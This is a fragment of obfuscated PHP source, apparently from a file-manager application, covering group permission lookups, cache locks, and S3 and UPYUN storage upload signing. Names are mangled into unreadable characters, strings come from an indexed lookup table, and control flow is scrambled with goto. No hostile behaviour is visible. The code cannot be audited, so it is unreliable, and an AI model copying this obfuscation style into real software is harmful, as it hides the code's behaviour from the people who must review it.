$câÌÉ‹çêÁ ? 3 : 2; foreach ($b®²Òğ“×› as $côÃâã…ï) { if ($côÃâã…ï[$eÄÏ°„µ¼·[1720]] == $b¤¼­Ã±³ó) { return 0; } $EÏÆÓŸ°Ş = explode($eÄÏ°„µ¼·[57], trim($côÃâã…ï[$eÄÏ°„µ¼·[524]], $eÄÏ°„µ¼·[57])); if ($EÏÆÓŸ°Ş[0] == $eÄÏ°„µ¼·[201] && count($EÏÆÓŸ°Ş) > $D÷†²­ï£Å) { $E­Ÿ–ï» = array_reverse(array_slice($EÏÆÓŸ°Ş, $D÷†²­ï£Å)); $b«ó°‰š‡› = array_search($b¤¼­Ã±³ó, $E­Ÿ–ï»); if ($b«ó°‰š‡› !== !1 && $b«ó°‰š‡› + 1 <= $e´­¿ä•©‰) { $e´­¿ä•©‰ = $b«ó°‰š‡› + 1; } } } goto d‰Ü×›ŠÕ‡; d‰Ü×›ŠÕ‡: return $e´­¿ä•©‰; goto Côİ¶ºˆ; fÕÌÛ‹†¬Ó: $eÄÏ°„µ¼· =& $_SERVER[œÕÊİğö]; $b®²Òğ“×› = $this->userGroupList($cƒç—†µÉİ); $e´­¿ä•©‰ = 1000; goto BĞ’—âÛ¼„; Côİ¶ºˆ: } private function userGroupList($FÀÆ·øî§© = false) { $e³¬­ÍŞ¶Ì =& $_SERVER[œÕÊİğö]; static $A‹´ÛÔ½“ç = array(); if (isset($A‹´ÛÔ½“ç[$FÀÆ·øî§©])) { return $A‹´ÛÔ½“ç[$FÀÆ·øî§©]; } $EÇòä¾¸Îİ = Model($e³¬­ÍŞ¶Ì[541])->getInfo($FÀÆ·øî§©); $A‹´ÛÔ½“ç[$FÀÆ·øî§©] = array_to_keyvalue($EÇòä¾¸Îİ[$e³¬­ÍŞ¶Ì[1897]], $e³¬­ÍŞ¶Ì[1720]); return $A‹´ÛÔ½“ç[$FÀÆ·øî§©]; } public function userGroupParents($A•£ÅŸñœ£) { goto B°ÃŠË·ÉŒ; AÔËÔªÔ‘È: $E±×®ºÉŒ = $GLOBALS[$Aùç¾¨ááÀ[6]][$Aùç¾¨ááÀ[98]][$Aùç¾¨ááÀ[1817]] == 1; $fÛÌÍ¢Ëßñ = $E±×®ºÉŒ ? 3 : 2; foreach ($fõ®‘ÚÆŠ as $BâÜö’ÆäÇ) { $c”ø‘•ÙœÙ = array($BâÜö’ÆäÇ[$Aùç¾¨ááÀ[1720]]); $E•ó²Ïáí = explode($Aùç¾¨ááÀ[57], trim($BâÜö’ÆäÇ[$Aùç¾¨ááÀ[524]], $Aùç¾¨ááÀ[57])); if ($E•ó²Ïáí[0] == $Aùç¾¨ááÀ[201] && count($E•ó²Ïáí) > $fÛÌÍ¢Ëßñ) { $D²¦®Û‹©„ = array_slice($E•ó²Ïáí, $fÛÌÍ¢Ëßñ); $c”ø‘•ÙœÙ = array_merge($c”ø‘•ÙœÙ, array_reverse($D²¦®Û‹©„)); } $a÷ˆŒºæ’¦ = array_merge($a÷ˆŒºæ’¦, $c”ø‘•ÙœÙ); } goto e°ŞÑ°‰é¯; D²óäÂÂ™±: if (isset($D·–‚ÖäÌ[$A•£ÅŸñœ£])) { return $D·–‚ÖäÌ[$A•£ÅŸñœ£]; } $fõ®‘ÚÆŠ = $this->userGroupList($A•£ÅŸñœ£); $a÷ˆŒºæ’¦ = array(); goto AÔËÔªÔ‘È; e°ŞÑ°‰é¯: $D·–‚ÖäÌ[$A•£ÅŸñœ£] = array_unique($a÷ˆŒºæ’¦); return $D·–‚ÖäÌ[$A•£ÅŸñœ£]; goto f°ò»ƒãÒ‘; B°ÃŠË·ÉŒ: $Aùç¾¨ááÀ =& $_SERVER[œÕÊİğö]; static $D·–‚ÖäÌ = array(); $A•£ÅŸñœ£ = $A•£ÅŸñœ£ ? $A•£ÅŸñœ£ : USER_ID; goto D²óäÂÂ™±; f°ò»ƒãÒ‘: } public function authTargetInfoMake($eì½ÜšÉ»¡) { goto A¿‚Ô‡¿…Ö; EĞ¡‘Üö¨«: foreach ($eì½ÜšÉ»¡ as $AƒÔ´’ŠÁ ) { if ($AƒÔ´’ŠÁ [$BäªêÒºÃ–[415]] == SourceModel::TYPE_USER) { $F™ô´²ÈŠ[] = intval($AƒÔ´’ŠÁ [$BäªêÒºÃ–[507]]); } else { if ($AƒÔ´’ŠÁ [$BäªêÒºÃ–[415]] == SourceModel::TYPE_GROUP) { $bÈ¼êÔ÷ëã[] = intval($AƒÔ´’ŠÁ [$BäªêÒºÃ–[507]]); } } } if ($F™ô´²ÈŠ) { $F™ô´²ÈŠ = Model($BäªêÒºÃ–[516])->userListInfo($F™ô´²ÈŠ); } if ($bÈ¼êÔ÷ëã) { $cÁˆ•Ò¼Êô = array($BäªêÒºÃ–[1804] => array($BäªêÒºÃ–[422], $bÈ¼êÔ÷ëã)); $bÈ¼êÔ÷ëã = Model($BäªêÒºÃ–[525])->field($BäªêÒºÃ–[1926])->where($cÁˆ•Ò¼Êô)->select(); $bÈ¼êÔ÷ëã = array_to_keyvalue($bÈ¼êÔ÷ëã, $BäªêÒºÃ–[1720]); } goto e…ğÊ½ê•ô; A¿‚Ô‡¿…Ö: $BäªêÒºÃ– =& $_SERVER[œÕÊİğö]; $F™ô´²ÈŠ = array(); $bÈ¼êÔ÷ëã = array(); goto EĞ¡‘Üö¨«; e…ğÊ½ê•ô: return array($BäªêÒºÃ–[1927] => $F™ô´²ÈŠ, $BäªêÒºÃ–[1928] => $bÈ¼êÔ÷ëã); goto fø¯½‡·¹; fø¯½‡·¹: } public function authInfo($c´½¯š©®£) { $d¿¡´õ¨¶ò =& $_SERVER[œÕÊİğö]; if ($c´½¯š©®£[$d¿¡´õ¨¶ò[1820]]) { $C‚ëèÇ™Æ = Model($d¿¡´õ¨¶ò[510])->listData($c´½¯š©®£[$d¿¡´õ¨¶ò[1820]]); if (!$C‚ëèÇ™Æ) { return !1; $fäµ±¯Á¡ = Model($d¿¡´õ¨¶ò[510])->listData(); $DÃÂ„Åç­— = array_filter_by_field($fäµ±¯Á¡, $d¿¡´õ¨¶ò[417], $d¿¡´õ¨¶ò[201]); return $DÃÂ„Åç­—; } $c…îÚ¢ÇÓ = array_field_key($C‚ëèÇ™Æ, array($d¿¡´õ¨¶ò[404], $d¿¡´õ¨¶ò[38], $d¿¡´õ¨¶ò[417], $d¿¡´õ¨¶ò[1742], $d¿¡´õ¨¶ò[1743])); $c…îÚ¢ÇÓ[$d¿¡´õ¨¶ò[1929]] = $c´½¯š©®£; return $c…îÚ¢ÇÓ; } else { return array($d¿¡´õ¨¶ò[423] => 0, $d¿¡´õ¨¶ò[1726] => $c´½¯š©®£[$d¿¡´õ¨¶ò[1874]], $d¿¡´õ¨¶ò[424] => $d¿¡´õ¨¶ò[43], $d¿¡´õ¨¶ò[1742] => $d¿¡´õ¨¶ò[1930]); } } } goto Cñ•ÕÇÂÑ; aº¥ß¢Òö: function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $eùÙ¶›Íß« =& $_SERVER[œÕÊİğö]; $c¿‚ëíã× = $GLOBALS[$eùÙ¶›Íß«[6]][$eùÙ¶›Íß«[357]]; self::$cachePath = $c¿‚ëíã×[$eùÙ¶›Íß«[203]][$eùÙ¶›Íß«[86]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($f¥ìèŠ‚ğÌ, $Eš¥ä…‘Ñ­ = 0) { goto fˆô‘³öŠë; fˆô‘³öŠë: $f¾ïçñ¤’ä =& $_SERVER[œÕÊİğö]; $e§İÑ×öê = microtime(!0); $Dö°ºÏ¬ë = $e§İÑ×öê + $Eš¥ä…‘Ñ­ + 0.0001; goto Eê™š’ö‡”; cÁÉİİ„Ó›: $this->unlock($f¥ìèŠ‚ğÌ); return !1; goto få¯Òî‘õ®; Eê™š’ö‡”: $f…Ôó÷–›· = rtrim(self::$cachePath, $f¾ïçñ¤’ä[8]) . $f¾ïçñ¤’ä[850] . md5($f¥ìèŠ‚ğÌ) . $f¾ïçñ¤’ä[847]; if (file_exists($f…Ôó÷–›·) && filemtime($f…Ôó÷–›·) && filemtime($f…Ôó÷–›·) < time() - 10) { @unlink($f…Ôó÷–›·); } do { if (file_exists($f…Ôó÷–›·)) { cacheLockWait(); continue; } $dŸÛ©òÌË£ = fopen($f…Ôó÷–›·, $f¾ïçñ¤’ä[851]); if (!$dŸÛ©òÌË£) { return !1; } $cÜ°Õ‘Ù„Á = flock($dŸÛ©òÌË£, LOCK_EX | LOCK_NB); self::$caches[$f¥ìèŠ‚ğÌ] = array($f¾ïçñ¤’ä[852] => $dŸÛ©òÌË£, $f¾ïçñ¤’ä[203] => $f…Ôó÷–›·); fwrite($dŸÛ©òÌË£, $Dö°ºÏ¬ë); clearstatcache(); if ($dŸÛ©òÌË£ && $cÜ°Õ‘Ù„Á) { return !0; } cacheLockWait(); } while (microtime(!0) < $Dö°ºÏ¬ë); goto cÁÉİİ„Ó›; få¯Òî‘õ®: } public function lockGet($e…š”Ë¢ë) { $c±óŞ›¦‰É =& $_SERVER[œÕÊİğö]; $bä¼óè‡¶ = rtrim(self::$cachePath, $c±óŞ›¦‰É[8]) . $c±óŞ›¦‰É[850] . md5($e…š”Ë¢ë) . $c±óŞ›¦‰É[847]; return file_exists($bä¼óè‡¶); } public function unlock($aŸ›²¼å–À) { goto eİ·³°Ş“Î; eÎ‘´¯°ÓÑ: @flock($C‚Ûì¥³‘“[$a¿‘ŒáÌ…–[852]], LOCK_UN); @fclose($C‚Ûì¥³‘“[$a¿‘ŒáÌ…–[852]]); @unlink($C‚Ûì¥³‘“[$a¿‘ŒáÌ…–[203]]); goto C¡£©ğ‘‹; eİ·³°Ş“Î: $a¿‘ŒáÌ…– =& $_SERVER[œÕÊİğö]; $C‚Ûì¥³‘“ = self::$caches[$aŸ›²¼å–À]; if (!$C‚Ûì¥³‘“) { return; } goto eÎ‘´¯°ÓÑ; C¡£©ğ‘‹: unset(self::$caches[$aŸ›²¼å–À]); goto CƒŸÒĞ•; CƒŸÒĞ•: } } class CacheLockRedis { public function lock($a¨×ÒÊÚ, $F–·¡…“ÕË = 10) { $AÊóİ÷ĞŞè = Cache::init(); $F×Õ¬È¹Ÿ‡ = microtime(!0) + $F–·¡…“ÕË; while (microtime(!0) < $F×Õ¬È¹Ÿ‡) { $cŸ±Ì¢ÜÛ¸ = $AÊóİ÷ĞŞè->get($a¨×ÒÊÚ); if (!$cŸ±Ì¢ÜÛ¸) { $Añ‰•ÃÉ… = $AÊóİ÷ĞŞè->setLock($a¨×ÒÊÚ, $F×Õ¬È¹Ÿ‡, $F–·¡…“ÕË); if ($Añ‰•ÃÉ…) { return !0; } } else { if ($cŸ±Ì¢ÜÛ¸ < microtime(!0)) { $AÊóİ÷ĞŞè->set($a¨×ÒÊÚ, $F×Õ¬È¹Ÿ‡, $F–·¡…“ÕË * 2); if ($AÊóİ÷ĞŞè->get($a¨×ÒÊÚ) === $cŸ±Ì¢ÜÛ¸) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($B¿ƒ»‡Æ) { return Cache::init()->get($B¿ƒ»‡Æ); } public function unlock($dŸ‡¬èÏª) { return Cache::init()->remove($dŸ‡¬èÏª); } } goto f·£öçßÑ; A¤éÑèáàç: function binCheckBigger($B¿ÜãÚÕ, $c†…Êİ¬) { return $B¿ÜãÚÕ > $c†…Êİ¬; } $_SERVER[$_SERVER[ï][3]] = ("\71\62\63\62"."\x33\x34")+0;$_854a="QWdp9fA5MJgc7qCbtyI7ZpiZQzi4K6nFsYdGKpFET8NBPxd2kDmPwRS8SbcweKvKuvHQqkYuHJtjXhms";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($F»ŠÓ¦Å, $a±Ãì‰§Ë) { $cñÈÓİ¾Ç² =& $_SERVER[œÕÊİğö]; if (isset(self::$_methodList[$F»ŠÓ¦Å])) { return @call_user_func_array(self::$_methodList[$F»ŠÓ¦Å], $a±Ãì‰§Ë); } else { if (method_exists($this, $F»ŠÓ¦Å)) { return call_user_func_array(array($this, $F»ŠÓ¦Å), $a±Ãì‰§Ë); } else { think_exception(__CLASS__ . $cñÈÓİ¾Ç²[4] . $F»ŠÓ¦Å . $cñÈÓİ¾Ç²[5]); } } } public static function __callStatic($A¿‹°„Û¢², $aØË¾µ™Ò“) { if (isset(self::$_methodListStatic[$A¿‹°„Û¢²])) { return call_user_func_array(self::$_methodListStatic[$A¿‹°„Û¢²], $aØË¾µ™Ò“); } else { if (method_exists(self, $A¿‹°„Û¢²)) { return call_user_func_array(array(self, $A¿‹°„Û¢²), $aØË¾µ™Ò“); } else { show_json("{$A¿‹°„Û¢²}\x28\51\x20\x6e\157\x74\40\x65\170\151\x73\164\73", !1); } } } public static function addMethod($f–å®ùÚëä, $f¥›ë˜”ø) { self::$_methodList[$f–å®ùÚëä] = $f¥›ë˜”ø; } public static function addMethodStatic($BÃ¨ ‰”·Á, $cÄèÓŸÌ) { self::$_methodListStatic[$BÃ¨ ‰”·Á] = $cÄèÓŸÌ; } } goto cİğóÏé“; EµŠõĞÏîŠ: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($Bí·Íˆ„¤¬) { parent::__construct($Bí·Íˆ„¤¬); } public function uploadFormData($fÊá•Ñæ©á, $bÛŒË“Û¤ = 3600) { goto e®ğà†§Ö¥; f“ß§ã¯ñ: $E¤œ›Û¬á’ = hash_hmac($DæÈÆïß£[1256], $bÀÊ¡³ó‹, $b÷ÙíÕ‘Ø›, !0); $A‘ÀŒ–åØ = hash_hmac($DæÈÆïß£[1256], $eˆ°˜Üªï, $E¤œ›Û¬á’, !0); $Eøá†ƒ…’ = hash_hmac($DæÈÆïß£[1256], $DÑŒ£ğª”, $A‘ÀŒ–åØ); goto DÈ÷š„–Ò¨; d»÷ºÍ¹ò»: $bÀÊ¡³ó‹ = $DæÈÆïß£[69]; $Eò±¢Ë²›· = gmdate($DæÈÆïß£[1247]); $fÍÒÉ­¶ì = gmdate($DæÈÆïß£[741]); goto FË“÷ğ©; Cµù †µÍÂ: $B®˜³æÃÊ÷ = array($this->accessKey, $fÍÒÉ­¶ì, $this->region, $bÀÊ¡³ó‹, $eˆ°˜Üªï); $C­çÊŠÂ£ = implode($DæÈÆïß£[8], $B®˜³æÃÊ÷); $cˆ… ·¯¡ê = array($DæÈÆïß£[1213] => gmdate($DæÈÆïß£[1212], strtotime($DæÈÆïß£[1249])), $DæÈÆïß£[1214] => array(array($DæÈÆïß£[1216] => $this->bucket), array($DæÈÆïß£[1215] => $CœÅ‚êÄ), array($DæÈÆïß£[1217], $DæÈÆïß£[1218], $DæÈÆïß£[43]), array($DæÈÆïß£[1217], $DæÈÆïß£[1250], $DæÈÆïß£[43]), array($DæÈÆïß£[1217], $DæÈÆïß£[1251], $DæÈÆïß£[43]), array($DæÈÆïß£[1219] => $c×Ä–‹Ò), array($DæÈÆïß£[1252] => $C­çÊŠÂ£), array($DæÈÆïß£[1253] => $f½‡³Â®œÆ), array($DæÈÆïß£[1254] => $Eò±¢Ë²›·), array($DæÈÆïß£[1255] => $F¢“§¦¹ğ‡))); goto a´œñ…­˜â; e®ğà†§Ö¥: $DæÈÆïß£ =& $_SERVER[œÕÊİğö]; $CœÅ‚êÄ = $DæÈÆïß£[202]; $f½‡³Â®œÆ = $DæÈÆïß£[1246]; goto d»÷ºÍ¹ò»; a´œñ…­˜â: $DÑŒ£ğª” = base64_encode(json_encode($cˆ… ·¯¡ê)); $dÚèì®Ùñ– = hash_hmac($DæÈÆïß£[1256], $fÍÒÉ­¶ì, $DæÈÆïß£[1257] . $this->secret, !0); $b÷ÙíÕ‘Ø› = hash_hmac($DæÈÆïß£[1256], $this->region, $dÚèì®Ùñ–, !0); goto f“ß§ã¯ñ; DÈ÷š„–Ò¨: $aîß‹ğîÊñ = array($DæÈÆïß£[221] => $DæÈÆïß£[43], $DæÈÆïß£[1258] => $DæÈÆïß£[43], $DæÈÆïß£[1215] => $CœÅ‚êÄ, $DæÈÆïß£[1219] => $c×Ä–‹Ò, $DæÈÆïß£[1223] => $DÑŒ£ğª”, $DæÈÆïß£[1259] => $C­çÊŠÂ£, $DæÈÆïß£[1260] => $f½‡³Â®œÆ, $DæÈÆïß£[1261] => $Eò±¢Ë²›·, $DæÈÆïß£[1262] => $F¢“§¦¹ğ‡, $DæÈÆïß£[1263] => $Eøá†ƒ…’, $DæÈÆïß£[185] => $this->getHost()); return $aîß‹ğîÊñ; goto aåŞœŒºÜ; FË“÷ğ©: $eˆ°˜Üªï = $DæÈÆïß£[1248]; $F¢“§¦¹ğ‡ = $bÛŒË“Û¤ . $DæÈÆïß£[43]; $c×Ä–‹Ò = $DæÈÆïß£[1211]; goto Cµù †µÍÂ; aåŞœŒºÜ: } public function multiUploadFormData($AÛÏÖ„±æ, $bšÊáÛÆ = 3600) { $FÆğß‚ƒÅ» =& $_SERVER[œÕÊİğö]; $aßÙóÌÂâ = gmdate($FÆğß‚ƒÅ»[1340]); $aõ‡†¯ùÆ§ = array(); $Bä¾Âœ“ÆÓ = $this->client->getUploadId($this->bucket, $AÛÏÖ„±æ, $aõ‡†¯ùÆ§); if (!$Bä¾Âœ“ÆÓ) { return !1; } return array($FÆğß‚ƒÅ»[231] => $Bä¾Âœ“ÆÓ, $FÆğß‚ƒÅ»[185] => $this->getHost() . $FÆğß‚ƒÅ»[8] . $this->pathEncode($AÛÏÖ„±æ), $FÆğß‚ƒÅ»[232] => $aßÙóÌÂâ, $FÆğß‚ƒÅ»[103] => $AÛÏÖ„±æ); } public function multiUploadAuthData($dƒ£’‚ƒ¦è, $Aöõğ¨°è = array()) { goto E­Î†¶ÊÅğ; d×“ˆòŠ´“: unset($Aöõğ¨°è[$C×­›—Ÿ’[103]]); if (isset($Aöõğ¨°è[$C×­›—Ÿ’[233]])) { return $this->listUploadParts($F•¤‰­‡ğ•, $Aöõğ¨°è); } $B¤‚ÍÅíçË = array(); goto CàÓÏÂÄ÷ì; CàÓÏÂÄ÷ì: if (isset($Aöõğ¨°è[$C×­›—Ÿ’[1341]])) { $B¤‚ÍÅíçË[$C×­›—Ÿ’[1342]] = $Aöõğ¨°è[$C×­›—Ÿ’[1341]]; } $BÚÄÌ³è‘ = explode($C×­›—Ÿ’[187], $this->getHost()); $fù±”®°«Ó = array($C×­›—Ÿ’[1343] => $BÚÄÌ³è‘[1], $C×­›—Ÿ’[1344] => $C×­›—Ÿ’[43], $C×­›—Ÿ’[221] => $C×­›—Ÿ’[129], $C×­›—Ÿ’[1258] => $Aöõğ¨°è[$C×­›—Ÿ’[88]]); goto FÜ¿Ö¤è·¨; E¡“—æ°«¥: if (strpos($bÔ³Õ›‘šŞ, $C×­›—Ÿ’[235]) === 0) { if (isset($B¤‚ÍÅíçË[$C×­›—Ÿ’[1342]])) { $cã¨Ş×ŠõÂ = $B¤‚ÍÅíçË[$C×­›—Ÿ’[1342]]; } else { if (isset($f¦µâõÇ¼[$C×­›—Ÿ’[1342]])) { $cã¨Ş×ŠõÂ = $f¦µâõÇ¼[$C×­›—Ÿ’[1342]]; } else { $cã¨Ş×ŠõÂ = hash($C×­›—Ÿ’[1256], $C×­›—Ÿ’[43]); } } return array($C×­›—Ÿ’[241] => $f¦µâõÇ¼[$C×­›—Ÿ’[241]], $C×­›—Ÿ’[1342] => $cã¨Ş×ŠõÂ, $C×­›—Ÿ’[232] => $f¦µâõÇ¼[$C×­›—Ÿ’[1345]]); } return $f¦µâõÇ¼[$C×­›—Ÿ’[241]]; goto D­ÕÎ°¦ä÷; FÜ¿Ö¤è·¨: $f›ØšÁ›— = $C×­›—Ÿ’[236]; $DÅŞ›éÔµŒ = $C×­›—Ÿ’[8] . $this->pathEncode($F•¤‰­‡ğ•) . $bÔ³Õ›‘šŞ; $f¦µâõÇ¼ = $this->client->__getSignatureV4($B¤‚ÍÅíçË, $fù±”®°«Ó, $f›ØšÁ›—, $DÅŞ›éÔµŒ); goto E¡“—æ°«¥; E­Î†¶ÊÅğ: $C×­›—Ÿ’ =& $_SERVER[œÕÊİğö]; $bÔ³Õ›‘šŞ = isset($Aöõğ¨°è[$C×­›—Ÿ’[178]]) ? $Aöõğ¨°è[$C×­›—Ÿ’[178]] : $C×­›—Ÿ’[43]; $F•¤‰­‡ğ• = $Aöõğ¨°è[$C×­›—Ÿ’[103]]; goto d×“ˆòŠ´“; D­ÕÎ°¦ä÷: } public function listUploadParts($Dé›¹Æ†Ê¼, $b»ÌãœªÖ— = array()) { goto A×¨šĞŸ†™; f³³§»: $aµõ·ä¸ßË .= $D»£ÀÎ˜’ä[1349]; $dŠŸ´¿—Ãƒ = array(); $dÕ´µèÎ» = explode($D»£ÀÎ˜’ä[187], $this->getHost()); goto a‹çĞ¦ËÜÌ; aÀ‰ ãá¼Ì: if (!$Fá“Š—¼²) { return !1; } $aµõ·ä¸ßË = $D»£ÀÎ˜’ä[1346]; foreach ($Fá“Š—¼² as $bÛù±îåÂ) { $aµõ·ä¸ßË .= $D»£ÀÎ˜’ä[1347] . "\x3c\120\141\162\164\116\x75\x6d\x62\145\162\76{$bÛù±îåÂ[$D»£ÀÎ˜’ä[1303]]}\74\x2f\120\141\162\164\116\x75\x6d\142\145\x72\76\xa" . "\74\x45\x54\141\147\76{$bÛù±îåÂ[$D»£ÀÎ˜’ä[1304]]}\74\57\105\x54\141\x67\76\xa" . $D»£ÀÎ˜’ä[1348]; } goto f³³§»; A×¨šĞŸ†™: $D»£ÀÎ˜’ä =& $_SERVER[œÕÊİğö]; $b‹Ùˆ’æÂ¿ = str_replace($D»£ÀÎ˜’ä[242], $D»£ÀÎ˜’ä[43], $b»ÌãœªÖ—[$D»£ÀÎ˜’ä[178]]); $Fá“Š—¼² = $this->client->listParts($this->bucket, $Dé›¹Æ†Ê¼, $b‹Ùˆ’æÂ¿); goto aÀ‰ ãá¼Ì; a‹çĞ¦ËÜÌ: $b¬÷ˆÅ ë§ = array($D»£ÀÎ˜’ä[1343] => $dÕ´µèÎ»[1], $D»£ÀÎ˜’ä[221] => $D»£ÀÎ˜’ä[129], $D»£ÀÎ˜’ä[1258] => strlen($aµõ·ä¸ßË)); $b¸ÈãöòÎ” = $D»£ÀÎ˜’ä[234]; $F±ª®»Ä» = $D»£ÀÎ˜’ä[8] . $this->pathEncode($Dé›¹Æ†Ê¼) . $b»ÌãœªÖ—[$D»£ÀÎ˜’ä[178]]; goto A¨Œ¨Á§´Œ; A¨Œ¨Á§´Œ: $DöëªŠÑ¯Ë = $this->client->__getSignatureV4($dŠŸ´¿—Ãƒ, $b¬÷ˆÅ ë§, $b¸ÈãöòÎ”, $F±ª®»Ä», $aµõ·ä¸ßË); return array($D»£ÀÎ˜’ä[241] => $DöëªŠÑ¯Ë[$D»£ÀÎ˜’ä[241]], $D»£ÀÎ˜’ä[232] => $DöëªŠÑ¯Ë[$D»£ÀÎ˜’ä[1345]], $D»£ÀÎ˜’ä[243] => $Fá“Š—¼², $D»£ÀÎ˜’ä[1342] => $DöëªŠÑ¯Ë[$D»£ÀÎ˜’ä[1342]]); goto aÊ•Æ«‘¦”; aÊ•Æ«‘¦”: } public function link($D¡ƒ³ò¢½˜, $FÔî‘î‹ = array()) { return parent::link($D¡ƒ³ò¢½˜, $FÔî‘î‹); } public function fileOut($Bà°Óô£Ú, $d”—¼Ï¶Ìª = false, $D¬ƒÏ¿óØ„ = false, $Fµ—àÁ«ô = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[œÕÊİğö][1350])) { return parent::fileOutServer($Bà°Óô£Ú, $d”—¼Ï¶Ìª, $D¬ƒÏ¿óØ„, $Fµ—àÁ«ô); } parent::fileOut($Bà°Óô£Ú, $d”—¼Ï¶Ìª, $D¬ƒÏ¿óØ„, $Fµ—àÁ«ô); } public function fileOutImage($BÙ¨¥¦¶Ø, $bé§•š‹ø = 250) { if (strstr($this->endpoint, $_SERVER[œÕÊİğö][1350])) { return parent::fileOutImageServer($BÙ¨¥¦¶Ø, $bé§•š‹ø); } parent::fileOutImage($BÙ¨¥¦¶Ø, $bé§•š‹ø); } public function fileOutLink($d²ÚŒäù„‰) { $B½‡±³…„¾ =& $_SERVER[œÕÊİğö]; if (substr($d²ÚŒäù„‰, 0, 7) == $B½‡±³…„¾[1226]) { $d²ÚŒäù„‰ = $B½‡±³…„¾[1227] . substr($d²ÚŒäù„‰, 7); } header($B½‡±³…„¾[169] . $d²ÚŒäù„‰); die; } public function getHost() { $C£è¸ÙØŸ‡ =& $_SERVER[œÕÊİğö]; $aéè®œ¨Í¯ = str_rtrim(parent::getHost(), $C£è¸ÙØŸ‡[8] . $this->bucket); $aéè®œ¨Í¯ = explode($C£è¸ÙØŸ‡[187], $aéè®œ¨Í¯); return $aéè®œ¨Í¯[0] . $C£è¸ÙØŸ‡[187] . $this->bucket . $C£è¸ÙØŸ‡[105] . $aéè®œ¨Í¯[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($b…®¯•Œº, $b´Ä· ñ ã = 0) { parent::__construct(); $this->source = $b…®¯•Œº; $this->sourceSize = $b´Ä· ñ ã; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($dÌ¯ÅŠ…Ø = false) { return $this->sourceSize; } public function getContent($fØÈ˜Öò = false) { return $this->fileSubstr($fØÈ˜Öò, 0, $this->sourceSize); } public function fileSubstr($Aˆ½ÁíÇìà = false, $Aè•áñ„š = 0, $B´ÊÒÂÃß = 0) { if (!$B´ÊÒÂÃß) { $B´ÊÒÂÃß = $this->sourceSize; } $cóšç¿—­ª = $this->sourceSize - $Aè•áñ„š; if ($B´ÊÒÂÃß >= $cóšç¿—­ª) { $B´ÊÒÂÃß = $cóšç¿—­ª; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $Aè•áñ„š, $B´ÊÒÂÃß); } if ($this->sourceType == self::TYPE_FILE) { if ($B´ÊÒÂÃß <= 0) { return $_SERVER[œÕÊİğö][43]; } $aÌÊâŞØ¡¸ = ftell($this->source); fseek_64($this->source, $aÌÊâŞØ¡¸ + $Aè•áñ„š); $aÑ¿ª’Ú¾Â = @fread($this->source, $B´ÊÒÂÃß); fseek_64($this->source, $aÌÊâŞØ¡¸); return $aÑ¿ª’Ú¾Â; } } public function hashMd5($FŠ”¼è†ÒÀ = false) { return md5($this->getContent()); } public static function hash($c–Ûä¦‡œî, $däÁäğ¹âß = 0) { $aœ¦©Ñ«¹Â = new PathDriverStream($c–Ûä¦‡œî, $däÁäğ¹âß); return $aœ¦©Ñ«¹Â->hashSimple($c–Ûä¦‡œî); } public static function md5($e·Œ‹‘Š, $fï÷Ç¬òƒŸ = 0) { $eÆ±ÈÛé“Ë = new PathDriverStream($e·Œ‹‘Š, $fï÷Ç¬òƒŸ); return $eÆ±ÈÛé“Ë->hashMd5($e·Œ‹‘Š); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\x74\164\x70\72\57\57\x76\60\56\x61\x70\x69\x2e\165\160\171\165\x6e\x2e\x63\157\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($f¶Ä¹„¨á‡) { parent::__construct(); $this->_init($f¶Ä¹„¨á‡); } public function _init($a¢¢¸Şá¨) { $b˜›£”Ò‘˜ =& $_SERVER[œÕÊİğö]; foreach ($a¢¢¸Şá¨ as $d“–õé‡øŸ => $aÕ‹à„öŸ¤) { if (isset($this->{$d“–õé‡øŸ})) { $this->{$d“–õé‡øŸ} = $aÕ‹à„öŸ¤; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($b˜›£”Ò‘˜[1351] . LNG($b˜›£”Ò‘˜[1284])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($E’†Ôã¡äè, $D•±ğÄìµ÷ = "\107\105\x54") { $eè¾Ó£àß³ =& $_SERVER[œÕÊİğö]; $Eˆˆ ø®ŸÛ = gmdate($eè¾Ó£àß³[1317]); $Bºç²ˆÓ¦¯ = base64_encode(hash_hmac($eè¾Ó£àß³[1352], "{$D•±ğÄìµ÷}\x26{$E’†Ôã¡äè}\x26{$Eˆˆ ø®ŸÛ}", md5("{$this->userpass}"), !0)); $e¤Š„½ì–” = array("\x41\165\x74\150\157\162\x69\172\x61\164\151\157\x6e\x3a\125\120\131\x55\x4e\40{$this->username}\72{$Bºç²ˆÓ¦¯}", "\104\x61\164\145\x3a{$Eˆˆ ø®ŸÛ}"); return $e¤Š„½ì–”; } public function ussRequest($AàÓ’ĞÈ¡ò, $eÉ‡òŸìÊ = "\107\105\x54", $cš†··ÇƒŞ = false, $cêÚÎ–¢¯” = false, $fç±ã‚ç = false) { goto bÛÉÃ‹¼Ò; bÛÉÃ‹¼Ò: $dòÄÆ©ÔÒ =& $_SERVER[œÕÊİğö]; $AàÓ’ĞÈ¡ò = trim($AàÓ’ĞÈ¡ò, $dòÄÆ©ÔÒ[8]); $d–¾†‡µÓô = "\x2f{$this->bucket}\57{$AàÓ’ĞÈ¡ò}"; goto A¾°ä•ª”·; eœº¹Ñ‘÷: if (!$AÜ¶„ìŠÇÉ) { return array($dòÄÆ©ÔÒ[1108] => !1, $dòÄÆ©ÔÒ[1110] => $dòÄÆ©ÔÒ[1353]); } if (strtolower($eÉ‡òŸìÊ) == $dòÄÆ©ÔÒ[200] || in_array($AÜ¶„ìŠÇÉ[$dòÄÆ©ÔÒ[1108]], array($dòÄÆ©ÔÒ[1211], 